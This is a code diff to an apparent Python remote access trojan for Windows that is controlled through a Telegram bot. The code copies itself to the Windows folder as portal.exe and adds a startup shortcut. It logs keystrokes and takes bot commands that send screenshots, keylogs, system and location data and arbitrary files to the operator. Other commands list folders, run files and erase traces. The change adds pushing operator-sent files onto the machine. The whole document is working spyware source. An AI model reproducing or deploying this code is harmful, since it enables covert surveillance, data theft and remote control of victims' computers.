@@ -2,7 +2,7 @@
 
 from PIL import ImageGrab
 from time import strftime, sleep
-from shutil import copyfile
+from shutil import copyfile, copyfileobj
 from sys import argv
 from json import loads
 from winshell import startup
@@ -13,6 +13,19 @@ import pyHook, pythoncom
 
 me = singleton.SingleInstance()
 
+# REPLACE '1234:abcd' BY THE TOKEN OF THE BOT YOU GENERATED!
+token = '1234:abcd'
+
+def checkchat_id(chat_id):
+	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
+	known_ids = ['123456']
+	# COMMENT THE LINE 'return True'!
+	return True
+	try:
+		return str(chat_id) in known_ids
+	except:
+		return str(chat_id) == known_ids
+		
 win_folder = os.environ['WINDIR'] 
 hide_location = win_folder + '\\' + 'portal.exe'
 target_file = startup() + '\\portal.lnk'
@@ -46,118 +59,115 @@ def pressed_chars(event):	# on key pressed function
 
 def handle(msg):
 	chat_id = msg['chat']['id']
-	command = msg['text']
 	print('')
 	#print(strftime('[%d %b, %y %r] ') + str(chat_id) + ': ' + command)
-	print command
-	print msg
 
 	if checkchat_id(chat_id):
-		if command == '/capture_pc':
-			bot.sendChatAction(chat_id, 'typing')
-			screenshot = ImageGrab.grab()
-			screenshot.save('screenshot.jpg')
-			bot.sendChatAction(chat_id, 'upload_photo')
-			bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
-			os.remove('screenshot.jpg')
-
-		elif command == '/keylogs':
-			bot.sendChatAction(chat_id, 'upload_document')
-			bot.sendDocument(chat_id, open(log_file, "rb"))
-
-		elif command == '/pc_info':
-			bot.sendChatAction(chat_id, 'typing')
-			info = ''
-			for pc_info in platform.uname():
-				info += '\n' + pc_info
-			bot.sendMessage(chat_id, info)
-
-		elif command.startswith('/msg_box '):
-			message = command.replace('/msg_box ', '')
-			if message == '':
-				bot.sendMessage(chat_id, '/msg_box yourText')
-			else:
-				ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
-				bot.sendMessage(chat_id, 'MsgBox Displayed')
-
-		elif command == '/ip_info':
-			bot.sendChatAction(chat_id, 'find_location')
-			info = requests.get('http://ipinfo.io').text
-			bot.sendMessage(chat_id, info)
-			location = (loads(info)['loc']).split(',')
-			bot.sendLocation(chat_id, location[0], location[1])
-
-		elif command.startswith('/download_file'):
-			path = command.replace('/download_file', '')
-			path = path[1:]
-			if path == '':
+		print msg
+		if 'text' in msg:
+			command = msg['text']
+			print command
+			if command == '/capture_pc':
 				bot.sendChatAction(chat_id, 'typing')
-				bot.sendMessage(chat_id, '/download_file C:/path/to/file')
-			else:
-				try:
-					bot.sendChatAction(chat_id, 'upload_document')
-					bot.sendDocument(chat_id, open(path, 'rb'))
-				except:
-					bot.sendMessage(chat_id, 'Could not find file')
+				screenshot = ImageGrab.grab()
+				screenshot.save('screenshot.jpg')
+				bot.sendChatAction(chat_id, 'upload_photo')
+				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
+				os.remove('screenshot.jpg')
 
-		elif command.startswith('/list_dir'):
-			bot.sendChatAction(chat_id, 'typing')
-			path = command.replace('/list_dir', '')
-			path = path[1:]
-			if path == '':
-				bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
-			else:
-				try:
-					files = os.listdir(path)
-					human_readable = ''
-					for file in files:
-						human_readable += file + '\n'
-					human_readable += human_readable + '\n^Contents of ' + path
-					bot.sendMessage(chat_id, human_readable)
-				except:
-					bot.sendMessage(chat_id, 'Invalid path')
+			elif command == '/keylogs':
+				bot.sendChatAction(chat_id, 'upload_document')
+				bot.sendDocument(chat_id, open(log_file, "rb"))
 
-		elif command.startswith('/run_file'):
-			bot.sendChatAction(chat_id, 'typing')
-			path = command.replace('/run_file', '')
-			path = path[1:]
-			if path == '':
-				bot.sendMessage(chat_id, '/run_file C:/path/to/file')
-			else:
-				os.startfile(path)
-				bot.sendMessage(chat_id, 'Command executed')
+			elif command == '/pc_info':
+				bot.sendChatAction(chat_id, 'typing')
+				info = ''
+				for pc_info in platform.uname():
+					info += '\n' + pc_info
+				bot.sendMessage(chat_id, info)
 
-		elif command == '/self_destruct':
-			bot.sendChatAction(chat_id, 'typing')
-			global initi
-			initi = True
-			bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")
+			elif command.startswith('/msg_box '):
+				message = command.replace('/msg_box ', '')
+				if message == '':
+					bot.sendMessage(chat_id, '/msg_box yourText')
+				else:
+					ctypes.windll.user32.MessageBoxA(0, message, 'Information', 0)
+					bot.sendMessage(chat_id, 'MsgBox Displayed')
 
-		elif command == 'DESTROYNOW!' and initi == True:
-			bot.sendChatAction(chat_id, 'typing')
-			bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
-			if os.path.isfile(hide_location):
-				os.remove(hide_location)
-			if os.path.isfile(target_file):
-				os.remove(target_file)
-			if os.path.isfile(log_file):
-				os.remove(log_file)
-			while True:
-				sleep(10)
+			elif command == '/ip_info':
+				bot.sendChatAction(chat_id, 'find_location')
+				info = requests.get('http://ipinfo.io').text
+				bot.sendMessage(chat_id, info)
+				location = (loads(info)['loc']).split(',')
+				bot.sendLocation(chat_id, location[0], location[1])
 
-def checkchat_id(chat_id):
-	# REPLACE '123456' WITH YOUR ACTUAL chat_id!
-	known_ids = ['124356']
-	# COMMENT THE LINE 'return True'!
-	return True
+			elif command.startswith('/download_file'):
+				path = command.replace('/download_file', '')
+				path = path[1:]
+				if path == '':
+					bot.sendChatAction(chat_id, 'typing')
+					bot.sendMessage(chat_id, '/download_file C:/path/to/file')
+				else:
+					try:
+						bot.sendChatAction(chat_id, 'upload_document')
+						bot.sendDocument(chat_id, open(path, 'rb'))
+					except:
+						bot.sendMessage(chat_id, 'Could not find file')
 
-	try:
-		return str(chat_id) in known_ids
-	except:
-		return str(chat_id) == known_ids
+			elif command.startswith('/list_dir'):
+				bot.sendChatAction(chat_id, 'typing')
+				path = command.replace('/list_dir', '')
+				path = path[1:]
+				if path == '':
+					bot.sendMessage(chat_id, '/list_dir C:/path/to/folder')
+				else:
+					try:
+						files = os.listdir(path)
+						human_readable = ''
+						for file in files:
+							human_readable += file + '\n'
+						human_readable += human_readable + '\n^Contents of ' + path
+						bot.sendMessage(chat_id, human_readable)
+					except:
+						bot.sendMessage(chat_id, 'Invalid path')
 
-# REPLACE 'abcd1234' BY THE TOKEN OF THE BOT YOU GENERATED!
-bot = telepot.Bot('abcd1234')
+			elif command.startswith('/run_file'):
+				bot.sendChatAction(chat_id, 'typing')
+				path = command.replace('/run_file', '')
+				path = path[1:]
+				if path == '':
+					bot.sendMessage(chat_id, '/run_file C:/path/to/file')
+				else:
+					os.startfile(path)
+					bot.sendMessage(chat_id, 'Command executed')
+
+			elif command == '/self_destruct':
+				bot.sendChatAction(chat_id, 'typing')
+				global initi
+				initi = True
+				bot.sendMessage(chat_id, "You sure? Type 'DESTROYNOW!' to proceed.")
+
+			elif command == 'DESTROYNOW!' and initi == True:
+				bot.sendChatAction(chat_id, 'typing')
+				bot.sendMessage(chat_id, "DESTROYING ALL TRACES! POOF!")
+				if os.path.isfile(hide_location):
+					os.remove(hide_location)
+				if os.path.isfile(target_file):
+					os.remove(target_file)
+				if os.path.isfile(log_file):
+					os.remove(log_file)
+				while True:
+					sleep(10)
+		else:
+			file_name = msg['document']['file_name']
+			file_id = msg['document']['file_id']
+			file_path = bot.getFile(file_id=file_id)['file_path']
+			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
+			file = (requests.get(link, stream=True)).raw
+			with open(file_name, 'wb') as out_file:
+				copyfileobj(file, out_file)
+
+bot = telepot.Bot(token)
 
 bot.message_loop(handle)
 print 'Listening to commands...'
